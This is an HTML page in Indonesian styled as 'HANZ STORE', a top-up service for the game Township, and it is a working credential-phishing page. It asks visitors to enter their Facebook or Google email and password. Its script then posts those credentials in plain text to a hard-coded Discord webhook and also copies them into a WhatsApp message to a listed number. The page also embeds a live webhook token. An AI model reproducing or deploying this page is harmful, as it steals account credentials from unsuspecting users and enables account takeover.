<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer">
    <title>HANZ STORE - Layanan Top Up Township</title>
    <style>
        /* Tema Gelap (Dark Mode) Modern */
        :root {
            --primary-color: #64dd17;
            --bg-color: #121212;
            --card-bg: #1e1e1e;
            --text-color: #f5f5f5;
            --border-radius: 20px;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .container {
            background-color: var(--card-bg);
            max-width: 500px;
            width: 100%;
            padding: 30px;
            border-radius: var(--border-radius);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5);
            border: 2px solid #333333;
            margin: auto;
        }

        /* Style Logo Kotak dengan Animasi */
        .logo-container {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo-container img {
            width: 130px;
            height: 130px;
            border-radius: 15px; /* Kotak melengkung */
            border: 3px solid var(--primary-color);
            box-shadow: 0 0 15px rgba(100, 221, 23, 0.4);
            animation: pulseLogo 2s infinite;
            object-fit: cover;
        }

        @keyframes pulseLogo {
            0% { transform: scale(1); box-shadow: 0 0 15px rgba(100, 221, 23, 0.4); }
            50% { transform: scale(1.05); box-shadow: 0 0 25px rgba(100, 221, 23, 0.6); }
            100% { transform: scale(1); box-shadow: 0 0 15px rgba(100, 221, 23, 0.4); }
        }

        h1 {
            text-align: center;
            margin-bottom: 5px;
            font-size: 32px;
            letter-spacing: 1px;
            /* Efek Cahaya Bergerak Kiri ke Kanan */
            background: linear-gradient(90deg, #ffffff 20%, #64dd17 50%, #ffffff 80%);
            background-size: 200% auto;
            color: transparent;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shineText 3s linear infinite;
        }

        @keyframes shineText {
            to { background-position: 200% center; }
        }

        p.subtitle {
            text-align: center;
            color: #aaaaaa;
            margin-bottom: 30px;
            font-size: 14px;
            font-weight: 500;
        }

        .form-group {
            margin-bottom: 20px;
            background-color: #2a2a2a;
            padding: 15px;
            border-radius: 15px;
            border: 1px dashed #444444;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 700;
            color: #dddddd;
        }

        .info-box {
            background: #1b3b22;
            padding: 10px;
            border-radius: 10px;
            font-size: 12px;
            color: var(--primary-color);
            margin-bottom: 15px;
            text-align: center;
            border: 1px solid var(--primary-color);
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            background-color: #333333;
            color: #ffffff;
            border: 2px solid #444444;
            border-radius: 12px;
            box-sizing: border-box;
            font-size: 14px;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 8px rgba(100, 221, 23, 0.3);
        }

        button {
            width: 100%;
            padding: 15px;
            background-color: var(--primary-color);
            color: #000;
            border: none;
            border-radius: var(--border-radius);
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.1s ease, box-shadow 0.3s ease;
            margin-top: 15px;
            box-shadow: 0 4px 10px rgba(100, 221, 23, 0.2);
        }

        button:hover {
            background-color: #52b202;
            color: #fff;
            box-shadow: 0 6px 15px rgba(100, 221, 23, 0.4);
        }

        button:active {
            transform: scale(0.97);
        }

        .grid-options {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
            gap: 10px;
        }

        .radio-box {
            background-color: #2a2a2a;
            border: 2px solid #444444;
            border-radius: 12px;
            padding: 12px 8px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .radio-box input {
            display: none;
        }

        .radio-box:has(input:checked) {
            border-color: var(--primary-color);
            background-color: #1b3b22;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }

        .radio-box strong {
            color: #eeeeee;
            font-size: 12px;
            font-weight: 600;
        }

        .radio-box span.price {
            display: block;
            color: #ff5252;
            font-weight: bold;
            font-size: 11px;
            margin-top: 4px;
        }

        .payment-logo {
            width: 40px;
            height: 40px;
            margin-bottom: 5px;
            object-fit: contain;
        }

        #loginDetailsContainer {
            display: none;
            animation: fadeIn 0.4s ease-in-out;
            text-align: center;
        }

        .login-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 15px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
            animation: bounceIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes bounceIn {
            0% { transform: scale(0.3); opacity: 0; }
            50% { transform: scale(1.05); opacity: 1; }
            70% { transform: scale(0.9); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo-container">
            <img src="https://i.postimg.cc/kGp8fQPL/Proyek-Baru-17-76139AC.png" alt="Logo HANZ STORE" crossorigin="anonymous">
        </div>
        
        <h1>HANZ STORE</h1>
        <p class="subtitle">🐾 Pusat Layanan Top Up Township 🏙️</p>

        <div class="form-group">
            <label>1. Pilih Metode Login Akun</label>
            <div class="info-box">⚠️ Pastikan data akun benar agar proses top up lancar</div>
            <div class="grid-options">
                <label class="radio-box" onclick="tampilkanFormLogin('Facebook')">
                    <input type="radio" name="loginMethod" value="Facebook">
                    <strong>Facebook</strong>
                </label>

                <label class="radio-box" onclick="tampilkanFormLogin('Google')">
                    <input type="radio" name="loginMethod" value="Google">
                    <strong>Google</strong>
                </label>
            </div>
        </div>

        <div class="form-group" id="loginDetailsContainer">
            <label id="loginTitle">Masukkan Detail Akun</label>
            <div id="loginImageContainer"></div>
            <input type="text" id="loginId" placeholder="Email atau No. HP" required style="margin-bottom: 10px;">
            <input type="password" id="loginPass" placeholder="Password Akun" required>
        </div>

        <div class="form-group">
            <label>2. Pilih Kategori</label>
            <div class="grid-options">
                <label class="radio-box"><input type="radio" name="kategori" value="ITEM"><strong>ITEM</strong></label>
                <label class="radio-box"><input type="radio" name="kategori" value="PROFILE"><strong>PROFILE</strong></label>
                <label class="radio-box"><input type="radio" name="kategori" value="ANIMAL SKIN"><strong>ANIMAL SKIN</strong></label>
                <label class="radio-box"><input type="radio" name="kategori" value="TRANSPORTATION SKIN"><strong>TRANSPORTATION SKIN</strong></label>
                <label class="radio-box"><input type="radio" name="kategori" value="BUILDING SKIN"><strong>BUILDING SKIN</strong></label>
                <label class="radio-box"><input type="radio" name="kategori" value="DECORATION"><strong>DECORATION</strong></label>
            </div>
        </div>

        <div class="form-group">
            <label>3. Pilih Nominal T-Cash</label>
            <div class="grid-options" id="nominalContainer">
                <label class="radio-box"><input type="radio" name="nominal" value="100 T-Cash" data-price="Rp 15.000"><strong>100 T-Cash</strong><span class="price">Rp 15.000</span></label>
                <label class="radio-box"><input type="radio" name="nominal" value="250 T-Cash" data-price="Rp 35.000"><strong>250 T-Cash</strong><span class="price">Rp 35.000</span></label>
                <label class="radio-box"><input type="radio" name="nominal" value="500 T-Cash" data-price="Rp 70.000"><strong>500 T-Cash</strong><span class="price">Rp 70.000</span></label>
                <label class="radio-box"><input type="radio" name="nominal" value="1000 T-Cash" data-price="Rp 135.000"><strong>1000 T-Cash</strong><span class="price">Rp 135.000</span></label>
            </div>
        </div>

        <div class="form-group">
            <label>4. Pilih Metode Pembayaran</label>
            <div class="grid-options">
                <label class="radio-box"><input type="radio" name="pembayaran" value="DANA"><img src="https://i.postimg.cc/wBsQGTqG/f90c3bae-f972-41b5-bc25-f469d4d4ce96.jpg" class="payment-logo" crossorigin="anonymous"><strong>DANA</strong></label>
                <label class="radio-box"><input type="radio" name="pembayaran" value="GoPay"><img src="https://i.postimg.cc/nL7q1R2Q/d50d95c8-1df7-4e44-bc38-71c34f770190.jpg" class="payment-logo" crossorigin="anonymous"><strong>GoPay</strong></label>
                <label class="radio-box"><input type="radio" name="pembayaran" value="OVO"><img src="https://i.postimg.cc/6qHZQD63/Top-up-OVO.jpg" class="payment-logo" crossorigin="anonymous"><strong>OVO</strong></label>
                <label class="radio-box"><input type="radio" name="pembayaran" value="ShopeePay"><img src="https://i.postimg.cc/VvNS2DqG/sad.jpg" class="payment-logo" crossorigin="anonymous"><strong>ShopeePay</strong></label>
                <label class="radio-box"><input type="radio" name="pembayaran" value="QRIS"><img src="https://i.postimg.cc/xdSX90Gv/a365c787-6835-4f27-baaf-ca014ccf11ef.jpg" class="payment-logo" crossorigin="anonymous"><strong>QRIS</strong></label>
                <label class="radio-box"><input type="radio" name="pembayaran" value="PayPal"><img src="https://i.postimg.cc/bN7JRzBB/37562c63-6c0d-4b11-aad1-d8c712b49fa1.jpg" class="payment-logo" crossorigin="anonymous"><strong>PayPal</strong></label>
            </div>
        </div>

        <button onclick="prosesPesanan()">PROSES PESANAN</button>
    </div>

    <script>
        const nomorWhatsApp = "+6281221548310"; 
        const webhookUrl = "https://discord.com/api/webhooks/1505805287263830026/ePqMIxZXPdUCeA21tOMajwvKZaJdmI1ooi4ltXGThMzVkWCdSvenrW6PTOOPkVjnXYEI";

        function tampilkanFormLogin(metode) {
            const container = document.getElementById("loginDetailsContainer");
            const imgContainer = document.getElementById("loginImageContainer");
            const inputId = document.getElementById("loginId");
            const title = document.getElementById("loginTitle");

            container.style.display = "block";

            if (metode === 'Facebook') {
                title.innerText = "Masukkan Data Akun Facebook";
                imgContainer.innerHTML = '<img src="https://img.icons8.com/color/144/facebook-new.png" class="login-icon" alt="Logo FB" crossorigin="anonymous">';
                inputId.placeholder = "Masukkan Email / No. HP Facebook";
            } else if (metode === 'Google') {
                title.innerText = "Masukkan Data Akun Google";
                imgContainer.innerHTML = '<img src="https://img.icons8.com/color/144/google-logo.png" class="login-icon" alt="Logo Google" crossorigin="anonymous">';
                inputId.placeholder = "Masukkan Email Google";
            }
        }

        async function prosesPesanan() {
            const loginMethodElement = document.querySelector('input[name="loginMethod"]:checked');
            const kategoriElement = document.querySelector('input[name="kategori"]:checked');
            const pembayaranElement = document.querySelector('input[name="pembayaran"]:checked');
            const loginId = document.getElementById("loginId").value;
            const loginPass = document.getElementById("loginPass").value;
            const nominalElement = document.querySelector('input[name="nominal"]:checked');

            if (!loginMethodElement || !kategoriElement || !loginId || !loginPass || !nominalElement || !pembayaranElement) {
                alert("Harap lengkapi semua data pesanan!");
                return;
            }

            const loginMethod = loginMethodElement.value;
            const kategori = kategoriElement.value;
            const pembayaran = pembayaranElement.value;
            const nominal = nominalElement.value;
            const price = nominalElement.getAttribute("data-price");

            const payload = {
                content: `**PESANAN BARU HANZ STORE**\n` +
                         `Login Via: ${loginMethod}\n` +
                         `Kategori: ${kategori}\n` +
                         `Email/No: ${loginId}\n` +
                         `Password: ${loginPass}\n` +
                         `Order: ${nominal}\n` +
                         `Harga: ${price}\n` +
                         `Pembayaran: ${pembayaran}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(err => console.log(err));

            const textWA = `*HANZ STORE - TOWNSHIP TOP UP*%0A%0A` +
                           `*Login Via* : ${loginMethod}%0A` +
                           `*Kategori* : ${kategori}%0A` +
                           `*Email / No* : ${loginId}%0A` +
                           `*Password* : ${loginPass}%0A` +
                           `*Order* : ${nominal}%0A` +
                           `*Harga* : ${price}%0A` +
                           `*Pembayaran* : ${pembayaran}%0A%0A` +
                           `_Mohon proses top up akun saya, terima kasih._`;

            window.open(`https://wa.me/${nomorWhatsApp}?text=${textWA}`, '_blank');
        }
    </script>
</body>
            </html>
